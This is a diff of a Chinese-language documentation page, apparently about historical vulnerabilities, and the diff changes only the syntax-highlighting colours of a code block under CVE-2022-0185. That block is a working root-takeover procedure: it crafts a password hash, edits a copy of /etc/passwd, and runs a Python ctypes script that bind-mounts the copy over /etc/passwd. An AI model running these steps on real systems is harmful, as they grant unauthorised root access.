@@ -21,28 +21,28 @@
 &lt;h1 id="历史漏洞">历史漏洞&lt;a class="td-heading-self-link" href="#%e5%8e%86%e5%8f%b2%e6%bc%8f%e6%b4%9e" aria-label="Heading self-link">&lt;/a>&lt;/h1>
 &lt;h2 id="cve-2022-0185">CVE-2022-0185&lt;a class="td-heading-self-link" href="#cve-2022-0185" aria-label="Heading self-link">&lt;/a>&lt;/h2>
 &lt;p>&lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0185">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0185&lt;/a> 漏洞，通过如下操作，可以让普通用户直接重置 root 密码。主要利用的是 bind mount 功能，将 /etc/passwd 文件覆盖&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ cd ~
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ &lt;span style="color:#204a87">cd&lt;/span> ~
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ cp /etc/passwd ./
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ openssl passwd -1 -salt abc password
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$1$abc$BXBqpb9BZcZhXLgbee.0s/
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">$1$abc$BXBqpb9BZcZhXLgbee&lt;/span>.0s/
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 将第一行的 root:x 改为 root:$1$abc$BXBqpb9BZcZhXLgbee.0s/&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># 将第一行的 root:x 改为 root:$1$abc$BXBqpb9BZcZhXLgbee.0s/&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ head -2 passwd
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>root:$1$abc$BXBqpb9BZcZhXLgbee.0s/:0:0:root:/root:/bin/bash
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>root:&lt;span style="color:#000">$1$abc$BXBqpb9BZcZhXLgbee&lt;/span>.0s/:0:0:root:/root:/bin/bash
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ cat mount-passwd.py
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>from ctypes import *
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc &lt;span style="color:#f92672">=&lt;/span> CDLL&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;libc.so.6&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc.mount.argtypes &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>c_char_p, c_char_p, c_char_p, c_ulong, c_char_p&lt;span style="color:#f92672">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>MS_BIND &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">4096&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>source &lt;span style="color:#f92672">=&lt;/span> b&lt;span style="color:#e6db74">&amp;#34;&amp;lt;HOME&amp;gt;/passwd&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>target &lt;span style="color:#f92672">=&lt;/span> b&lt;span style="color:#e6db74">&amp;#34;/etc/passwd&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>filesystemtype &lt;span style="color:#f92672">=&lt;/span> b&lt;span style="color:#e6db74">&amp;#34;none&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>options &lt;span style="color:#f92672">=&lt;/span> b&lt;span style="color:#e6db74">&amp;#34;rw&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mountflags &lt;span style="color:#f92672">=&lt;/span> MS_BIND
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc.mount&lt;span style="color:#f92672">(&lt;/span>source, target, filesystemtype, mountflags, options&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">libc&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> CDLL&lt;span style="color:#ce5c00;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;libc.so.6&amp;#34;&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc.mount.argtypes &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">(&lt;/span>c_char_p, c_char_p, c_char_p, c_ulong, c_char_p&lt;span style="color:#ce5c00;font-weight:bold">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">MS_BIND&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">4096&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87">source&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> b&lt;span style="color:#4e9a06">&amp;#34;&amp;lt;HOME&amp;gt;/passwd&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">target&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> b&lt;span style="color:#4e9a06">&amp;#34;/etc/passwd&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">filesystemtype&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> b&lt;span style="color:#4e9a06">&amp;#34;none&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">options&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> b&lt;span style="color:#4e9a06">&amp;#34;rw&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mountflags&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> MS_BIND
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc.mount&lt;span style="color:#ce5c00;font-weight:bold">(&lt;/span>source, target, filesystemtype, mountflags, options&lt;span style="color:#ce5c00;font-weight:bold">)&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>把上面的 &amp;lt;HOME&amp;gt; 换成你的 home 目录
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
